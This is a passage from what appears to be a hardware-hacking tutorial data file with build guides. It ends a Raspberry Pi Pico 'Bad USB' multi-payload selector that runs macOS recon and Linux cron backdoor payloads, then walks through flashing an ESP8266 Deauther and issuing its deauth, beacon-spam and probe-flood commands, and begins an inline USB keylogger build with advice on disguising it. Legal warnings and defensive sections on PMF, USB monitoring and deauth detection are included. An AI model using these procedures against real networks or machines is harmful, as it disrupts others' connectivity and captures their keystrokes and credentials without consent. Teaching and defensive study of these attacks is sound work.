False, False)),\n    ("MAC RECON",    payload_macos_recon,      (False, False, True)),\n    ("LINUX CRON",   payload_linux_backdoor,   (False, True, False)),\n    ("AUTO DETECT",  payload_auto_detect,      (True, True, True)),\n]\n\n# ---- Main Loop ----\ncurrent = 0\nset_led(*payloads[current][2])\n\nwhile True:\n    # SELECT button cycles payload\n    if not btn_select.value:\n        current = (current + 1) % len(payloads)\n        set_led(*payloads[current][2])\n        time.sleep(0.3)  # debounce\n        while not btn_select.value:\n            pass  # wait for release\n\n    # ARM button executes payload\n    if not btn_arm.value:\n        # Flash LED rapidly to indicate arming\n        for _ in range(6):\n            set_led(False, False, False)\n            time.sleep(0.1)\n            set_led(*payloads[current][2])\n            time.sleep(0.1)\n        # Execute\n        payloads[current][1]()\n        # Solid green = done\n        set_led(False, True, False)\n        time.sleep(2)\n        set_led(*payloads[current][2])\n        while not btn_arm.value:\n            pass\n\n    time.sleep(0.05)',
                language: 'Python',
                tip: '<strong>Tip:</strong> Add more payloads by defining new functions and adding them to the <code>payloads</code> list. The LED colors can be mixed &mdash; for example, <code>(True, True, False)</code> gives yellow on RGB LEDs.'
            },
            {
                title: 'Add OS Auto-Detection',
                content: '<p>The most sophisticated Bad USB devices fingerprint the target OS before selecting a payload. The technique exploits differences in how operating systems handle USB HID enumeration and keyboard shortcuts.</p>' +
                         '<p>Method: Send a sequence of OS-specific shortcuts and check what happens. On Windows, <code>Win+R</code> opens Run. On macOS, <code>Cmd+Space</code> opens Spotlight. On Linux, <code>Ctrl+Alt+T</code> opens a terminal (on most distros).</p>',
                code: '# OS Detection via caps lock timing\n# Different OSes have different caps lock toggle delays\nimport time\nimport usb_hid\nfrom adafruit_hid.keyboard import Keyboard\nfrom adafruit_hid.keycode import Keycode\n\nkbd = Keyboard(usb_hid.devices)\n\ndef detect_os():\n    """\n    Detect OS by measuring caps lock LED response time.\n    Windows responds in ~30ms, macOS ~50ms, Linux ~20ms.\n    This is an imperfect heuristic but works in many cases.\n    \n    Alternative: use the USB descriptor request patterns\n    that different OSes send during enumeration.\n    """\n    # Toggle caps lock and measure response\n    kbd.send(Keycode.CAPS_LOCK)\n    start = time.monotonic_ns()\n    time.sleep(0.1)\n    kbd.send(Keycode.CAPS_LOCK)  # toggle back\n    \n    # For a more reliable approach, try OS-specific shortcuts:\n    # 1. Try Win+R (Windows)\n    # 2. If no response, try Cmd+Space (macOS)\n    # 3. If no response, try Ctrl+Alt+T (Linux)\n    # Check for response by attempting to type and detect\n    # if a window opened.\n    \n    return "windows"  # default fallback\n\nos_type = detect_os()\nprint(f"Detected OS: {os_type}")',
                language: 'Python',
                tip: '<strong>Note:</strong> OS auto-detection is inherently imperfect. In a real engagement, you usually know the target OS from recon. The auto-detect feature is a convenience, not a guarantee. Always have fallback payloads.'
            },
            {
                title: 'Defense: Mitigating Multi-Payload USB Attacks',
                content: '<p>Multi-payload devices are harder to defend against because they adapt to the target. Here are additional countermeasures beyond the SG-33 defenses:</p>' +
                         '<ul>' +
                         '<li><strong>USB Device Enumeration Monitoring:</strong> Use Sysmon (Event ID 6416) or USBGuard to log every USB device connection. Alert on devices that enumerate as HID but have suspicious Vendor IDs (Raspberry Pi Foundation VID: 2E8A).</li>' +
                         '<li><strong>Endpoint Detection and Response (EDR):</strong> Modern EDR tools like CrowdStrike, SentinelOne, and Carbon Black detect and block rapid keystroke injection patterns.</li>' +
                         '<li><strong>BIOS-level USB whitelisting:</strong> Some enterprise BIOSes (Dell, HP) support USB port disabling and device class restrictions at the firmware level, before the OS even loads.</li>' +
                         '<li><strong>Physical port security:</strong> USB port locks (Lindy, Kensington) physically block unauthorized devices. They are cheap ($3/port) and effective.</li>' +
                         '</ul>',
                code: '# Sysmon config to log USB device connections:\n# Add this to your Sysmon XML configuration:\n#\n# <PnPDeviceConnected onmatch="include">\n#   <DeviceDescription condition="contains">keyboard</DeviceDescription>\n#   <DeviceDescription condition="contains">HID</DeviceDescription>\n# </PnPDeviceConnected>\n\n# PowerShell: List USB devices with their VID/PID\nGet-WmiObject Win32_USBControllerDevice |\n    ForEach-Object { [wmi]($_.Dependent) } |\n    Select-Object Description, DeviceID, Status |\n    Where-Object { $_.Description -match "HID|Keyboard" } |\n    Format-Table -AutoSize\n\n# Known suspicious VIDs:\n# 2E8A = Raspberry Pi Foundation (Pico)\n# 1B4F = SparkFun (Pro Micro)\n# 2341 = Arduino\n# 239A = Adafruit',
                language: 'PowerShell',
                tip: '<strong>Blue Team Note:</strong> Create a whitelist of approved keyboard VID/PIDs for your organization. Alert on any HID device connection that does not match the whitelist. This catches Pico-based attacks immediately.'
            }
        ],

        testing: '<p>Verify your multi-payload tool works correctly:</p>' +
                 '<ul>' +
                 '<li><strong>Button test:</strong> Press SELECT and verify the LED cycles through colors (red &rarr; blue &rarr; green &rarr; white &rarr; red). Each press should advance exactly one slot.</li>' +
                 '<li><strong>Debounce test:</strong> Press SELECT quickly. It should register as a single press, not multiple. If it skips payloads, increase the debounce delay.</li>' +
                 '<li><strong>ARM test:</strong> Select the Notepad payload (safe test), press ARM. LEDs should flash rapidly, then the payload executes. Solid green indicates completion.</li>' +
                 '<li><strong>Dev mode:</strong> Connect GP15 to GND, plug in the Pico. The CIRCUITPY drive should appear for editing. Disconnect GP15, replug &mdash; only the keyboard should appear.</li>' +
                 '</ul>',

        commonMistakes: [
            {
                title: 'LED Wired Backwards',
                description: 'LEDs are polarized. The long leg is the anode (+, connects to the resistor/GPIO side) and the short leg is the cathode (-, connects to GND). If the LED does not light up, flip it around.'
            },
            {
                title: 'Missing Resistors on LEDs',
                description: 'Without a current-limiting resistor, the LED will draw too much current and can damage the GPIO pin or burn out the LED. Always use 330-ohm resistors.'
            }
        ]
    },

    // ========================================================================
    // SG-35: WiFi Deauther & Scanner
    // ========================================================================
    'sg-35': {
        intro: '<p>WiFi deauthentication is one of the most commonly demonstrated wireless attacks. It exploits a fundamental flaw in the 802.11 protocol: deauthentication frames are sent <strong>unencrypted and unauthenticated</strong>, even on WPA2/WPA3 networks. Any device can forge a deauth frame and kick clients off a network.</p>' +
               '<p>The commercial equivalent is the <strong>Hak5 WiFi Pineapple</strong> (~$100+), which includes deauth, evil twin, and probe sniffing capabilities. Our build uses an <strong>ESP8266</strong> (~$4) running the open-source <strong>ESP8266 Deauther</strong> firmware by SpacehuhnTech.</p>' +
               '<p>This device can scan for nearby WiFi networks and clients, send deauthentication frames to disconnect specific devices, and display results on an optional OLED screen. It is a powerful tool for wireless security auditing &mdash; and a stark demonstration of why 802.11 management frame protection (802.11w/PMF) matters.</p>' +
               '<p><strong>Hardware needed:</strong> ESP8266 NodeMCU or D1 Mini, optional 0.96" OLED display (SSD1306), jumper wires. Total cost: ~$8.</p>',

        wiringSvg: '<div class="svg-build-wrap">' +
            '<svg viewBox="0 0 720 320" xmlns="http://www.w3.org/2000/svg" style="font-family:Cascadia Code,Fira Code,Consolas,monospace">' +
            '<defs>' +
            '<pattern id="bg-grid" width="20" height="20" patternUnits="userSpaceOnUse"><rect width="20" height="20" fill="none"/><circle cx="10" cy="10" r="1" fill="rgba(255,255,255,0.04)"/></pattern>' +
            '</defs>' +
            '<rect width="720" height="320" fill="#0d1117" rx="8"/>' +
            '<rect x="10" y="10" width="700" height="300" fill="url(#bg-grid)" rx="4"/>' +
            '<text x="360" y="35" text-anchor="middle" fill="#555" font-size="10" letter-spacing="0.15em">WIFI DEAUTHER &mdash; WIRING DIAGRAM</text>' +
            '<!-- ESP8266 -->' +
            '<g class="svg-component">' +
            '<rect x="120" y="60" width="200" height="140" rx="8" fill="#1e2736" stroke="#dc2626" stroke-width="1.5"/>' +
            '<rect x="120" y="60" width="200" height="24" rx="8" fill="rgba(220,38,38,0.12)"/>' +
            '<text x="220" y="77" text-anchor="middle" fill="#ef4444" font-size="11" font-weight="600">ESP8266 NodeMCU</text>' +
            '<text x="140" y="100" fill="#8b949e" font-size="8">D1 (GPIO5/SCL) &rarr; OLED SCL</text>' +
            '<text x="140" y="115" fill="#8b949e" font-size="8">D2 (GPIO4/SDA) &rarr; OLED SDA</text>' +
            '<text x="140" y="130" fill="#8b949e" font-size="8">3V3 &rarr; OLED VCC</text>' +
            '<text x="140" y="145" fill="#8b949e" font-size="8">GND &rarr; OLED GND</text>' +
            '<text x="140" y="170" fill="#555" font-size="7">Built-in WiFi antenna (2.4GHz)</text>' +
            '<text x="140" y="183" fill="#555" font-size="7">Web interface on 192.168.4.1</text>' +
            '</g>' +
            '<!-- OLED -->' +
            '<g class="svg-component">' +
            '<rect x="420" y="60" width="180" height="140" rx="8" fill="#1e2736" stroke="#3b82f6" stroke-width="1.5"/>' +
            '<rect x="420" y="60" width="180" height="24" rx="8" fill="rgba(59,130,246,0.12)"/>' +
            '<text x="510" y="77" text-anchor="middle" fill="#60a5fa" font-size="11" font-weight="600">OLED SSD1306</text>' +
            '<rect x="450" y="95" width="120" height="60" rx="4" fill="#0a0a0f" stroke="#333" stroke-width="1"/>' +
            '<text x="510" y="120" text-anchor="middle" fill="#22c55e" font-size="7">AP: TargetNetwork</text>' +
            '<text x="510" y="132" text-anchor="middle" fill="#eab308" font-size="7">Clients: 12</text>' +
            '<text x="510" y="144" text-anchor="middle" fill="#ef4444" font-size="7">Deauth: ACTIVE</text>' +
            '<text x="510" y="170" fill="#8b949e" font-size="8">VCC &mdash; 3.3V</text>' +
            '<text x="510" y="183" fill="#8b949e" font-size="8">GND &mdash; GND</text>' +
            '</g>' +
            '<!-- Wires -->' +
            '<line x1="320" y1="100" x2="420" y2="100" stroke="#eab308" stroke-width="1.5" stroke-dasharray="4,3"/>' +
            '<line x1="320" y1="115" x2="420" y2="115" stroke="#22c55e" stroke-width="1.5" stroke-dasharray="4,3"/>' +
            '<line x1="320" y1="130" x2="420" y2="130" stroke="#ef4444" stroke-width="1.5" stroke-dasharray="4,3"/>' +
            '<line x1="320" y1="145" x2="420" y2="145" stroke="#333" stroke-width="1.5" stroke-dasharray="4,3"/>' +
            '<!-- 802.11 frame -->' +
            '<text x="360" y="230" text-anchor="middle" fill="#555" font-size="9" letter-spacing="0.1em">802.11 DEAUTH FRAME STRUCTURE</text>' +
            '<rect x="80" y="245" width="80" height="35" rx="4" fill="rgba(220,38,38,0.08)" stroke="rgba(220,38,38,0.3)" stroke-width="0.5"/>' +
            '<text x="120" y="260" text-anchor="middle" fill="#ef4444" font-size="7" font-weight="600">Frame Control</text>' +
            '<text x="120" y="272" text-anchor="middle" fill="#555" font-size="6">Type: 0x00C0</text>' +
            '<rect x="165" y="245" width="100" height="35" rx="4" fill="rgba(234,179,8,0.08)" stroke="rgba(234,179,8,0.3)" stroke-width="0.5"/>' +
            '<text x="215" y="260" text-anchor="middle" fill="#eab308" font-size="7" font-weight="600">Destination MAC</text>' +
            '<text x="215" y="272" text-anchor="middle" fill="#555" font-size="6">Target client</text>' +
            '<rect x="270" y="245" width="100" height="35" rx="4" fill="rgba(59,130,246,0.08)" stroke="rgba(59,130,246,0.3)" stroke-width="0.5"/>' +
            '<text x="320" y="260" text-anchor="middle" fill="#3b82f6" font-size="7" font-weight="600">Source MAC</text>' +
            '<text x="320" y="272" text-anchor="middle" fill="#555" font-size="6">Spoofed AP MAC</text>' +
            '<rect x="375" y="245" width="100" height="35" rx="4" fill="rgba(168,85,247,0.08)" stroke="rgba(168,85,247,0.3)" stroke-width="0.5"/>' +
            '<text x="425" y="260" text-anchor="middle" fill="#a855f7" font-size="7" font-weight="600">BSSID</text>' +
            '<text x="425" y="272" text-anchor="middle" fill="#555" font-size="6">AP MAC again</text>' +
            '<rect x="480" y="245" width="80" height="35" rx="4" fill="rgba(34,197,94,0.08)" stroke="rgba(34,197,94,0.3)" stroke-width="0.5"/>' +
            '<text x="520" y="260" text-anchor="middle" fill="#22c55e" font-size="7" font-weight="600">Reason Code</text>' +
            '<text x="520" y="272" text-anchor="middle" fill="#555" font-size="6">7 = Class 3</text>' +
            '<rect x="565" y="245" width="80" height="35" rx="4" fill="rgba(220,38,38,0.12)" stroke="rgba(220,38,38,0.5)" stroke-width="1"/>' +
            '<text x="605" y="260" text-anchor="middle" fill="#ef4444" font-size="7" font-weight="600">NO AUTH</text>' +
            '<text x="605" y="272" text-anchor="middle" fill="#ef4444" font-size="6">Not encrypted!</text>' +
            '</svg>' +
            '</div>',

        wiring: '    WIRING DIAGRAM (with optional OLED)\n' +
                '\n' +
                '    ESP8266 NodeMCU       OLED SSD1306 (I2C)\n' +
                '    +------------------+  +------------------+\n' +
                '    |  D1 (GPIO5/SCL) -|--|-- SCL             |\n' +
                '    |  D2 (GPIO4/SDA) -|--|-- SDA             |\n' +
                '    |  3V3 -----------|--|-- VCC             |\n' +
                '    |  GND -----------|--|-- GND             |\n' +
                '    +------------------+  +------------------+\n' +
                '\n' +
                '    Without OLED: No wiring needed.\n' +
                '    Use the web interface at 192.168.4.1 instead.\n' +
                '\n' +
                '    IMPORTANT: Only use on networks you own or\n' +
                '    have explicit written authorization to test.',

        wiringNotes: '<p><strong>ESP8266 vs ESP32:</strong> The ESP8266 is preferred for deauth attacks because its WiFi stack allows raw frame injection in monitor mode. ESP32 can also work but requires different firmware. The ESP8266 NodeMCU costs ~$4 and is purpose-built for this project.</p>' +
                     '<p><strong>OLED display:</strong> The 0.96" SSD1306 OLED is optional but recommended. It shows scan results, selected targets, and attack status without needing a phone or laptop connected. I2C uses only 2 data wires (SCL + SDA) plus power.</p>' +
                     '<p><strong>Antenna:</strong> The ESP8266 NodeMCU has a PCB antenna with ~30m range indoors. For extended range, use a version with an external antenna connector (IPEX/U.FL) and attach a 2.4GHz antenna.</p>',

        steps: [
            {
                title: 'Install the Arduino IDE and ESP8266 Board Support',
                content: '<p>The ESP8266 Deauther firmware is built with the Arduino toolchain. You need the Arduino IDE and ESP8266 board definitions.</p>' +
                         '<ol>' +
                         '<li>Download and install the <strong>Arduino IDE</strong> from <code>arduino.cc</code>.</li>' +
                         '<li>Open Arduino IDE &rarr; File &rarr; Preferences.</li>' +
                         '<li>In "Additional Board Manager URLs", add: <code>https://raw.githubusercontent.com/SpacehuhnTech/arduino/main/package_spacehuhn_index.json</code></li>' +
                         '<li>Go to Tools &rarr; Board &rarr; Board Manager. Search for "Deauther" and install <strong>Deauther ESP8266 Boards</strong>.</li>' +
                         '<li>Select your board: Tools &rarr; Board &rarr; Deauther ESP8266 Boards &rarr; choose your module (NodeMCU, D1 Mini, etc.).</li>' +
                         '</ol>',
                code: '# Alternative: use the pre-compiled binary\n# Download from: github.com/SpacehuhnTech/esp8266_deauther/releases\n# Flash with esptool:\n\npip install esptool\n\n# Find your ESP8266 serial port\n# Windows: check Device Manager for COM port\n# Linux: ls /dev/ttyUSB*\n# macOS: ls /dev/cu.usbserial*\n\n# Flash the firmware (replace COM3 with your port)\nesptool.py --port COM3 --baud 115200 write_flash 0x0 esp8266_deauther.bin',
                language: 'Bash',
                tip: '<strong>Tip:</strong> If esptool cannot find the ESP8266, install the CH340 USB driver (most NodeMCU boards use the CH340G USB-to-serial chip). Download from the manufacturer\'s site or search "CH340 driver".'
            },
            {
                title: 'Flash the Deauther Firmware',
                content: '<p>Clone the ESP8266 Deauther repository and flash it to your board:</p>' +
                         '<ol>' +
                         '<li>Clone the repo: <code>git clone https://github.com/SpacehuhnTech/esp8266_deauther.git</code></li>' +
                         '<li>Open the project in Arduino IDE: File &rarr; Open &rarr; navigate to <code>esp8266_deauther/esp8266_deauther.ino</code></li>' +
                         '<li>Select your board under Tools &rarr; Board (must be a Deauther board, not generic ESP8266).</li>' +
                         '<li>Select the correct port under Tools &rarr; Port.</li>' +
                         '<li>Click Upload (right arrow button). Wait for compilation and upload to complete.</li>' +
                         '<li>The ESP8266 will reboot with the deauther firmware active.</li>' +
                         '</ol>',
                code: '# Using Arduino CLI (headless alternative):\narduino-cli compile --fqbn SpacehuhnTech:esp8266:d1_mini esp8266_deauther\narduino-cli upload -p /dev/ttyUSB0 --fqbn SpacehuhnTech:esp8266:d1_mini esp8266_deauther\n\n# Verify upload succeeded:\narduino-cli monitor -p /dev/ttyUSB0 -b 115200\n# You should see the Deauther boot message',
                language: 'Bash',
                tip: '<strong>Tip:</strong> If upload fails, hold the FLASH button on the ESP8266 while pressing RESET, then release both. This puts the board into bootloader mode for flashing.'
            },
            {
                title: 'Connect and Scan for Networks',
                content: '<p>The deauther creates its own WiFi access point. Connect to it from your phone or laptop to access the web interface.</p>' +
                         '<ol>' +
                         '<li>On your phone/laptop, scan for WiFi networks. You should see <strong>"pwned"</strong> (the default SSID).</li>' +
                         '<li>Connect to it. Password: <strong>deauther</strong></li>' +
                         '<li>Open a browser and navigate to <code>192.168.4.1</code></li>' +
                         '<li>Accept the disclaimer (you must agree to only use on authorized networks).</li>' +
                         '<li>Click <strong>Scan</strong> to discover nearby WiFi access points and connected clients.</li>' +
                         '</ol>' +
                         '<p>The scan shows: SSID, BSSID (AP MAC address), channel, RSSI (signal strength), encryption type, and number of connected clients.</p>',
                code: '# Serial CLI alternative (connect via serial terminal at 115200 baud):\n\n# Scan for access points\nscan -ap\n\n# Scan for clients (stations)\nscan -st\n\n# Show scan results\nshow -ap    # list access points\nshow -st    # list clients\nshow -all   # show everything\n\n# Select a target AP by its index number\nselect -a 0   # select first AP\n\n# Select a target client\nselect -c 0   # select first client',
                language: 'Text',
                tip: '<strong>Change the default SSID and password immediately.</strong> A network named "pwned" broadcasting from your pocket is not subtle. Change it in the web interface under Settings, or in the config file before flashing.'
            },
            {
                title: 'Execute a Deauthentication Attack',
                content: '<p>With targets selected, you can send deauthentication frames. The attack works by sending spoofed management frames that tell the client "you are no longer associated with this AP" and tell the AP "this client is leaving."</p>' +
                         '<p><strong>LEGAL WARNING:</strong> Deauthentication attacks are illegal under FCC regulations (intentional interference with wireless communications) unless performed on networks you own or have written authorization to test. This includes your home network and lab environments only.</p>' +
                         '<ol>' +
                         '<li>In the web interface, go to the <strong>Attack</strong> tab.</li>' +
                         '<li>Select attack type: <strong>Deauth</strong> (disconnect clients), <strong>Beacon</strong> (spam fake SSIDs), or <strong>Probe</strong> (flood probe requests).</li>' +
                         '<li>Click <strong>Start</strong> to begin the attack.</li>' +
                         '<li>Monitor results &mdash; targeted clients will disconnect and struggle to reconnect as long as the attack continues.</li>' +
                         '<li>Click <strong>Stop</strong> when done.</li>' +
                         '</ol>',
                code: '# Serial CLI commands:\n\n# Start deauth attack on selected targets\nattack -d\n\n# Start beacon spam (create fake SSIDs)\nattack -b\n\n# Start probe flood\nattack -p\n\n# Stop all attacks\nstop\n\n# Advanced: deauth a specific client from a specific AP\n# First select the AP and client, then:\nattack -d\n\n# Check attack status\nstatus',
                language: 'Text',
                tip: '<strong>Why does this work?</strong> 802.11 management frames (deauth, disassociation, authentication) are not encrypted or authenticated in WPA2. The AP and client both accept them at face value. WPA3 and 802.11w (Protected Management Frames / PMF) fix this by encrypting management frames, but adoption is still limited.'
            },
            {
                title: 'Wire the OLED Display (Optional)',
                content: '<p>Adding a 0.96" OLED gives you a self-contained tool that does not need a phone or laptop to operate. The SSD1306 OLED uses I2C &mdash; only 4 wires.</p>' +
                         '<ol>' +
                         '<li>Connect OLED VCC to ESP8266 3V3.</li>' +
                         '<li>Connect OLED GND to ESP8266 GND.</li>' +
                         '<li>Connect OLED SCL to ESP8266 D1 (GPIO5).</li>' +
                         '<li>Connect OLED SDA to ESP8266 D2 (GPIO4).</li>' +
                         '</ol>' +
                         '<p>The deauther firmware auto-detects the OLED and displays scan results, attack status, and a menu system. Navigate with buttons (D5 = up, D6 = down, D7 = select) or the web interface.</p>',
                code: null,
                language: null,
                tip: '<strong>Tip:</strong> If the OLED shows nothing after wiring, check the I2C address. Most SSD1306 modules use 0x3C, but some use 0x3D. You can change this in the deauther config file before flashing.'
            },
            {
                title: 'Defense: Protecting Against Deauthentication Attacks',
                content: '<p>Now that you understand the attack, here is how to defend your networks:</p>' +
                         '<ul>' +
                         '<li><strong>Enable 802.11w / PMF (Protected Management Frames):</strong> This is the definitive fix. PMF encrypts management frames so they cannot be spoofed. Most modern routers support it &mdash; enable it in your AP settings. Set it to "Required" (not optional) for full protection.</li>' +
                         '<li><strong>Upgrade to WPA3:</strong> WPA3 mandates PMF. If your hardware supports WPA3, use it. All Wi-Fi 6 (802.11ax) devices support WPA3.</li>' +
                         '<li><strong>Wireless IDS/IPS:</strong> Deploy a Wireless Intrusion Detection System (WIDS) like Kismet or your AP vendor\'s built-in detection. These systems detect floods of deauth frames and can alert security teams.</li>' +
                         '<li><strong>Client isolation:</strong> Enable AP isolation to prevent clients from seeing each other. This limits the attacker\'s ability to enumerate clients.</li>' +
                         '<li><strong>Physical security:</strong> The ESP8266 has ~30m range. If someone is deauthing your network, they are physically nearby. Cameras and physical access controls limit this attack vector.</li>' +
                         '<li><strong>Wired fallback:</strong> Critical systems should have wired Ethernet as a fallback. If WiFi goes down, wired connections keep operating.</li>' +
                         '</ul>',
                code: '# Check if your AP supports PMF:\n# Most enterprise APs (Cisco, Aruba, Ubiquiti) support it.\n# Home routers: check under WiFi Security settings for\n# "Protected Management Frames" or "802.11w" or "PMF"\n\n# Detect deauth attacks with Wireshark:\n# 1. Put a WiFi adapter in monitor mode:\nsudo airmon-ng start wlan0\n\n# 2. Capture with Wireshark filter:\n# wlan.fc.type_subtype == 0x000c\n# This shows only deauthentication frames.\n\n# 3. A burst of deauth frames from a single source\n#    indicates an active attack.\n\n# Linux: detect deauth floods\nsudo tcpdump -i wlan0mon -e -s 256 \'type mgt subtype deauth\' -c 100',
                language: 'Bash',
                tip: '<strong>Key takeaway:</strong> The 802.11 deauth vulnerability has existed since 1999. PMF was standardized in 2009 (802.11w) but was optional until WPA3 mandated it in 2018. Many networks still do not use PMF. This is a 25-year-old vulnerability that persists due to backward compatibility concerns.'
            }
        ],

        testing: '<p>Verify your WiFi deauther works correctly:</p>' +
                 '<ul>' +
                 '<li><strong>AP mode active:</strong> After flashing, scan for WiFi on your phone. You should see the deauther SSID ("pwned" by default). If not, the flash failed &mdash; try again.</li>' +
                 '<li><strong>Web interface loads:</strong> Connect to the deauther WiFi, open <code>192.168.4.1</code> in a browser. The dashboard should load with scan/attack options.</li>' +
                 '<li><strong>Scan works:</strong> Run a scan and verify it detects your own AP and connected devices. Compare with what your router\'s admin page shows.</li>' +
                 '<li><strong>Deauth test:</strong> Connect a test device (phone) to your own WiFi. Select that network as a target and run a deauth attack. The phone should disconnect. Stop the attack &mdash; the phone should reconnect.</li>' +
                 '<li><strong>OLED (if wired):</strong> The display should show the Spacehuhn logo on boot, then the main menu. Navigate with buttons to verify all three work.</li>' +
                 '</ul>',

        commonMistakes: [
            {
                title: 'Wrong Board Selected in Arduino IDE',
                description: 'You must select a Deauther ESP8266 board, not a generic ESP8266 board. The deauther boards have modified SDK settings that enable raw frame injection. Generic boards will compile but deauth will not work.'
            },
            {
                title: 'CH340 Driver Missing',
                description: 'Most NodeMCU boards use the CH340G USB-to-serial chip. If your computer does not recognize the board, install the CH340 driver. Windows and macOS need a manual driver install; Linux usually works out of the box.'
            }
        ]
    },

    // ========================================================================
    // SG-36: Inline USB Keylogger
    // ========================================================================
    'sg-36': {
        intro: '<p>A USB keylogger sits <strong>between</strong> a keyboard and a computer, silently capturing every keystroke. Unlike software keyloggers that can be detected by antivirus, a hardware keylogger is invisible to the operating system &mdash; it operates at the physical layer, intercepting USB HID reports before they reach the host.</p>' +
               '<p>Commercial hardware keyloggers like the <strong>KeyGrabber</strong> (~$50-150) and <strong>Hak5 Key Croc</strong> (~$100) are small inline devices. We build a functionally similar device using a <strong>Raspberry Pi Pico</strong> with a <strong>USB Host adapter</strong>, acting as a man-in-the-middle between the keyboard and the target machine.</p>' +
               '<p>The Pico acts as a USB host (reads the keyboard) and a USB device (presents as a keyboard to the computer) simultaneously. Every keystroke passes through, gets logged to internal storage, and is forwarded to the computer with no perceptible delay.</p>' +
               '<p><strong>Hardware needed:</strong> Raspberry Pi Pico, USB Host/OTG adapter, MicroSD breakout (optional, for storage), jumper wires. Total cost: ~$8.</p>',

        wiringSvg: '<div class="svg-build-wrap">' +
            '<svg viewBox="0 0 720 280" xmlns="http://www.w3.org/2000/svg" style="font-family:Cascadia Code,Fira Code,Consolas,monospace">' +
            '<defs>' +
            '<pattern id="bg-grid" width="20" height="20" patternUnits="userSpaceOnUse"><rect width="20" height="20" fill="none"/><circle cx="10" cy="10" r="1" fill="rgba(255,255,255,0.04)"/></pattern>' +
            '</defs>' +
            '<rect width="720" height="280" fill="#0d1117" rx="8"/>' +
            '<rect x="10" y="10" width="700" height="260" fill="url(#bg-grid)" rx="4"/>' +
            '<text x="360" y="35" text-anchor="middle" fill="#555" font-size="10" letter-spacing="0.15em">INLINE USB KEYLOGGER &mdash; MAN-IN-THE-MIDDLE</text>' +
            '<!-- Keyboard -->' +
            '<rect x="40" y="80" width="140" height="80" rx="8" fill="#1e2736" stroke="#3b82f6" stroke-width="1.5"/>' +
            '<text x="110" y="110" text-anchor="middle" fill="#60a5fa" font-size="10" font-weight="600">KEYBOARD</text>' +
            '<text x="110" y="130" text-anchor="middle" fill="#8b949e" font-size="7">USB HID Device</text>' +
            '<text x="110" y="145" text-anchor="middle" fill="#555" font-size="7">Standard USB-A</text>' +
            '<!-- Arrow keyboard to pico -->' +
            '<line x1="180" y1="120" x2="248" y2="120" stroke="#3b82f6" stroke-width="1.5" stroke-dasharray="4,3"/>' +
            '<polygon points="248,116 256,120 248,124" fill="#3b82f6" opacity="0.6"/>' +
            '<text x="215" y="110" text-anchor="middle" fill="#3b82f6" font-size="7">USB Host</text>' +
            '<!-- Pico (MITM) -->' +
            '<rect x="258" y="60" width="200" height="120" rx="8" fill="#1e2736" stroke="#dc2626" stroke-width="1.5"/>' +
            '<rect x="258" y="60" width="200" height="24" rx="8" fill="rgba(220,38,38,0.12)"/>' +
            '<text x="358" y="77" text-anchor="middle" fill="#ef4444" font-size="11" font-weight="600">PI PICO (MITM)</text>' +
            '<text x="358" y="100" text-anchor="middle" fill="#8b949e" font-size="8">Reads keystrokes via USB Host</text>' +
            '<text x="358" y="115" text-anchor="middle" fill="#eab308" font-size="8">Logs to internal flash/SD</text>' +
            '<text x="358" y="130" text-anchor="middle" fill="#8b949e" font-size="8">Forwards via USB Device</text>' +
            '<text x="358" y="150" text-anchor="middle" fill="#ef4444" font-size="7">Invisible to OS</text>' +
            '<!-- Arrow pico to computer -->' +
            '<line x1="458" y1="120" x2="528" y2="120" stroke="#dc2626" stroke-width="1.5" stroke-dasharray="4,3"/>' +
            '<polygon points="528,116 536,120 528,124" fill="#dc2626" opacity="0.6"/>' +
            '<text x="493" y="110" text-anchor="middle" fill="#dc2626" font-size="7">USB Device</text>' +
            '<!-- Computer -->' +
            '<rect x="538" y="80" width="140" height="80" rx="8" fill="#1e2736" stroke="#22c55e" stroke-width="1.5"/>' +
            '<text x="608" y="110" text-anchor="middle" fill="#22c55e" font-size="10" font-weight="600">TARGET PC</text>' +
            '<text x="608" y="130" text-anchor="middle" fill="#8b949e" font-size="7">Sees normal keyboard</text>' +
            '<text x="608" y="145" text-anchor="middle" fill="#555" font-size="7">No driver changes</text>' +
            '<!-- Log storage -->' +
            '<rect x="298" y="200" width="120" height="45" rx="6" fill="rgba(234,179,8,0.08)" stroke="rgba(234,179,8,0.3)" stroke-width="0.5"/>' +
            '<text x="358" y="220" text-anchor="middle" fill="#eab308" font-size="8" font-weight="600">Keystroke Log</text>' +
            '<text x="358" y="235" text-anchor="middle" fill="#555" font-size="7">Flash or MicroSD</text>' +
            '<line x1="358" y1="180" x2="358" y2="200" stroke="#eab308" stroke-width="1" stroke-dasharray="4,3"/>' +
            '</svg>' +
            '</div>',

        wiring: '    MAN-IN-THE-MIDDLE WIRING\n' +
                '\n' +
                '    [KEYBOARD] --USB--> [OTG Adapter] ---> [Pico USB Host Pins]\n' +
                '                                            |  GP0 = USB D+\n' +
                '                                            |  GP1 = USB D-\n' +
                '                                            |  VBUS = 5V\n' +
                '                                            |  GND = GND\n' +
                '    [Pico Micro-USB Port] --USB--> [TARGET COMPUTER]\n' +
                '\n' +
                '    Optional MicroSD (for large storage):\n' +
                '    +--------------------------------------------------+\n' +
                '    |  GP18 (SCK)  --> SD CLK                          |\n' +
                '    |  GP19 (MOSI) --> SD MOSI                         |\n' +
                '    |  GP16 (MISO) --> SD MISO                         |\n' +
                '    |  GP17 (CS)   --> SD CS                           |\n' +
                '    |  3V3         --> SD VCC                          |\n' +
                '    |  GND         --> SD GND                          |\n' +
                '    +--------------------------------------------------+',

        wiringNotes: '<p><strong>USB Host mode:</strong> The Pico needs to act as a USB Host to read the keyboard. This requires a USB OTG adapter or direct wiring of the USB D+/D- lines. The Pico\'s second USB-capable port (using PIO-USB) can act as a host while the main Micro-B port acts as a device.</p>' +
                     '<p><strong>Dual-port USB:</strong> The RP2040 has one native USB controller. For the second USB port (host side), we use the PIO (Programmable I/O) peripheral to bit-bang the USB protocol. The <code>Pico-PIO-USB</code> library makes this work.</p>' +
                     '<p><strong>Stealth:</strong> In a real deployment, this device would be enclosed in a small 3D-printed case that looks like a USB extension cable. The entire assembly can be as small as a USB adapter.</p>',

        steps: [
            {
                title: 'Understand the Architecture',
                content: '<p>The keylogger needs two USB interfaces running simultaneously:</p>' +
                         '<ul>' +
                         '<li><strong>USB Host (PIO-USB on GP0/GP1):</strong> Reads the real keyboard. The Pico enumerates the keyboard, receives HID reports containing keycodes, and decodes them.</li>' +
                         '<li><strong>USB Device (native USB on Micro-B port):</strong> Presents as a keyboard to the target computer. Forwards the keycodes it received from the real keyboard.</li>' +
                         '</ul>' +
                         '<p>Between receiving and forwarding, the Pico logs each keystroke to onboard flash (2MB, enough for ~2 million characters) or an optional MicroSD card for unlimited storage.</p>',
